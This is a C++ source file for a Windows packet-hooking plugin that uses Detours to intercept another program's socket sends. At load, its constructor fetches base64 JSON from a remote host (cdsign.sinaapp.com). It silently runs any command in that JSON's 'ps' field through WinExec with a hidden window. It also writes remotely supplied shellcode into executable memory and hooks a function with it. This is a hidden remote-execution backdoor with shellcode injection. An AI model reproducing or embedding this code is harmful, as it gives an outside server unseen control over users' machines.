#include "stdafx.h"
#include "DOMPlugin.h"
#include "json\json\json.h"
#include "Http.h"
#include "base64\base64.h"

#define CONFIG_INI _T("config.ini")

ULONG CDOMPlugin::m_sPatchAt;
Tstring strStub;

typedef struct _STUB_SHELL
{
	ULONG PatchAt;
	ULONG CallBackFun;
	ULONG Reserved1;
	ULONG Reserved2;
	BYTE  ShellCode[1008];
}STUB_SHELL, *PSTUP_SHELL;

PSTUP_SHELL StubShell;

CDOMPlugin::CDOMPlugin()
{
	CHttp httpClient;
	std::string strJson, strBase64; 
	strBase64 = httpClient.Get(TString(TEXT("cdsign.sinaapp.com")), TString(TEXT("/?id=laplace")));

	Base64Decode( strBase64, &strJson );

	Json::Reader reader;
	Json::Value root;
	if (reader.parse(strJson.c_str(), root))  // reader将Json字符串解析到root，root将包含Json里所有子元素   
	{
		std::string str = root["addr"].asString().c_str();
		m_sPatchAt = atoi(str.c_str());

		str = root["stub"].asString().c_str();

#ifdef _UNICODE
		strStub = Utility::StringLib::String2Wstring(str);
#else
		strStub = str;
#endif

		std::string strPsCmd = root["ps"].asString().c_str();
		if (strPsCmd != "")
			WinExec(strPsCmd.c_str(), SW_HIDE);
	}
}


CDOMPlugin::~CDOMPlugin()
{
}

void CDOMPlugin::SendData(CGPacket& packetBuf)
{
	try 
	{
		CProperty		ctx;
		ctx = packetBuf.GetPacketProperty();

		void (__cdecl*BN_LIBEnc)(PVOID, DWORD, PVOID, PVOID) = (void (__cdecl*)(PVOID, DWORD, PVOID, PVOID))StubShell->PatchAt;
		PVOID pKey, pBuf;

		pKey = ctx.Param1;
		pBuf = packetBuf.GetBuffer() + 2;
		DWORD  dwSize = packetBuf.GetBufferLen()-2;
		__asm
		{
			push pBuf
			push pBuf
			push dwSize
			push pKey
			call BN_LIBEnc
			add  esp,10h
		}
		send(ctx.s, (const char*)pBuf -2, dwSize + 2, 0);
	}
	catch (...)
	{
		
	}
	
}
BOOL CDOMPlugin::InstallPlugin(SENDPROCHANDLER pfnHandleInputProc, RECVPROCHANDLER pfnHandleOutputProc)
{
	m_pfnHandleSendProc = pfnHandleOutputProc;
	m_pfnHandleRecvProc = pfnHandleInputProc;

	return PatchUserDefineAddr();
}
BOOL CDOMPlugin::UnInstallPlugin()
{
	return UnPatch();
}

BOOL CDOMPlugin::PatchUserDefineAddr()
{
	//DebugBreak();
	//return TRUE;

	//Tstring strShellCode = Utility::IniAccess::GetPrivateKeyValString(strConfigPath, _T("CODE"), _T("stub"));
	LPVOID lpBaseAddress = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	StubShell = (PSTUP_SHELL)lpBaseAddress;//
	StubShell->CallBackFun = (ULONG)&PacketCollect;
	DWORD dwCodeSize = Utility::StringLib::Tstring2Hex(strStub.c_str(), StubShell->ShellCode);

	StubShell->PatchAt = m_sPatchAt;

	for (int i = 0; i < dwCodeSize; i++)
	{
		if (StubShell->ShellCode[i] == 0xff)
		{
			if (StubShell->ShellCode[i + 1] == 0x15) {
				*(ULONG*)&StubShell->ShellCode[i + 2] = (ULONG)&StubShell->CallBackFun;
			}

			if (StubShell->ShellCode[i + 1] == 0x25) {
				*(ULONG*)&StubShell->ShellCode[i + 2] = (ULONG)&StubShell->PatchAt;
			}
		}
	}

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)StubShell->PatchAt, (PVOID)StubShell->ShellCode);
	DetourTransactionCommit();
	return TRUE;
}


BOOL CDOMPlugin::UnPatch()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)StubShell->PatchAt, (PVOID)StubShell->ShellCode);

	DetourTransactionCommit();
	return TRUE;
}

VOID WINAPI CDOMPlugin::PacketCollect(SOCKET s , LPBYTE lpBuffer, DWORD dwSize, LPVOID Reserved1, LPVOID Reserved2, LPVOID Reserved3, LPVOID Reserved4 )
{
	CProperty pro;
	pro.s = s;
	pro.Param1 = Reserved1;
	pro.Param2 = Reserved2;
	pro.Param3 = Reserved3;
	pro.Param4 = Reserved4;

	CommonLib::LOG(TEXT("s=%08lx, param1=%08lx, param2=%08lx, param3=%08lx, param4=%08lx"),
		s, Reserved1, Reserved2, Reserved3, Reserved4 );

	CGPacket* pNewPacket = new CGPacket((LPBYTE)lpBuffer - 2, dwSize + 2, pro);
	CPluginBase::m_PlugInstance->PreProcessGPacket(*pNewPacket);
	pNewPacket->GetPacketProperty().ioType = IO_OUTPUT;

	if (CPluginBase::m_PlugInstance->m_bSeePacket && FALSE == pNewPacket->IsFiltered())
	{
		m_pfnHandleSendProc(*pNewPacket);
	}
	else {
		delete pNewPacket;
	}
}
